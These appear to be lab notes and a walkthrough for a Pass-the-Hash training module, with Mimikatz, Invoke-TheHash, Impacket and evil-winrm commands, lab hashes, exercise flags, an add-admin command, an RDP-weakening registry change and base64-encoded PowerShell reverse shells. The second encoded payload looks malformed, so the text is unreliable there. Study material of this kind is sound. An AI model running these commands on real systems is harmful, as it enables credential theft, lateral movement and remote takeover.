
> [!NOTE] PtH
> - Dumping the local SAM database from a compromised host.
> - Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
> - Pulling the hashes from memory (lsass.exe).

### Mimikatz PtH (Windows)

> [!NOTE]
> The Mimikatz module `sekurlsa::pth`, allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. This requires a few dependencies:
> - `/user` Username to impersonate
> - `/rc4` or `/NTLM`  NTLM hash of the user's password
> - `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.)
> - `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe)

##### Example: PtH from Windows Using Mimikatz
```go
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

### PowerShell Invoke-TheHash (Windows)


> [!summary]
> This is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

Two options to execute: SMBA or WMI command execution. 

#### Invoke-TheHash Parameters

|            |                                                                                                                                                           |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Target`   | Hostname or IP address of the target                                                                                                                      |
| `Username` | Username to use for authentication.                                                                                                                       |
| `Domain`   | Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username                          |
| `Hash`     | NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format                                                            |
| `Command`  | Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target |

#### Invoke-TheHash SMB

```go
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### Invoke-TheHash WMI

This creates a reverse shell on DC01
```go
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```


---
### PtH Linux

[Impacket](https://github.com/fortra/impacket) has tools for Command Execution, Credential Dumping and Enumeration. 

#### PtH w/ Impacket PsExec
```go
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

These other tools in the Impacket suite can also be used to PtH:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

#### PtH w/ CrackMapExec(Linux)

```go
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> [! Important ]
>To authenticate to each host while executing the above, use the `-local-auth` switch. If we  see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands.
>
>Check out the crackmapexe wikie here [CrackMapExec documentation Wiki](https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/)

### PtH w/ evil-winrm(Linux)
```go
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### PtH w/ RDP (Linux)

Passing the hash with RDP has a caveat:
Restricted Admin Mode, disabled by default, this should be enabled or you'll get the below error message:
![[Pasted image 20250517185320.png]]

Enable by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.

```go
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

When the registry key is added use `xfreerdp` with the `/pth` option to gain RDP access:

```go
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


---

## Questions

Target IP
```go
10.129.204.23
```

User
```go
Administrator
```

Password
```go
30B3783CE2ABF1AF70F77D0660CF3453
```

RDP
```go
xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

#### Question 1

Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

Use evil-winrm to access the Windows machine
```go
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

![[Pasted image 20250518070643.png]]
type `type pth.txt` to echo the contents of the file
```go
G3t_4CCE$$_V1@_PTH
```


#### Question 2

Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

The name of the registry value that must be set to 0 is `DisableRestrictedAdmin`.

Use evil-winrm to get into the box
```go
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Now change the registry key value by adding  `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0
```go
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[Pasted image 20250518113123.png]]

Try to RDP again
```go
xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```
![[Pasted image 20250518113351.png]]

#### Question 3
Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

Since this is asking us for a single users hash, execute the commands sequentially:
```go
mimikatz.exe
```

```go
privilege::debug
```

```go
sekurlsa::pth
```

```go
c39f2beb3d2ec06a62cb887fb391dee0
```

![[Pasted image 20250518125818.png]]


#### Question 4
Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

```go
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb" exit
```

When the new cmd displays, enter the following to "cat" the contents of david.txt
```go
more \\dc01\david\david.txt
```

Answer
```go
D3V1d_Fl5g_is_Her3
```

![[Pasted image 20250518140728.png]]

#### Question 5
Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

```go
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb" exit
```

Answer:
```go
JuL1()_SH@re_fl@g
```

![[Pasted image 20250518141100.png]]

#### Question 6

IP:
```go
10.129.143.222
```

Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

My connection was disconnected so issued the following commands again
```go
evil-winrm -i 10.129.143.222 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

In a separate terminal tab...
```go
xfreerdp /v:10.129.143.222 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```


Now back to the main course...

On the windows box, nav to C:\tools
```go
nc.exe -lvnp 8002
```

In powershell, execute both commands
```go
Import-Module .\Invoke-TheHash.psd1
```

```go
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEyOS4xNDMuMjIyJywgODAwMik7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"
```


#### Optional Exercises

Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.

```go
mimikatz.exe
```

```go
privilege::debug
```

```go
sekurlsa::logonpasswords
```

John's Hash
```go
c4b0e1b10c7ce2c4723b4e2407ef81a2
```
![[Pasted image 20250518152954.png]]

Connect via evil-winrm
```go
evil-winrm -i 10.129.143.222 -u John -H c4b0e1b10c7ce2c4723b4e2407ef81a2
```

Using impacket
```go
impacket-psexec John@10.129.143.222 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
```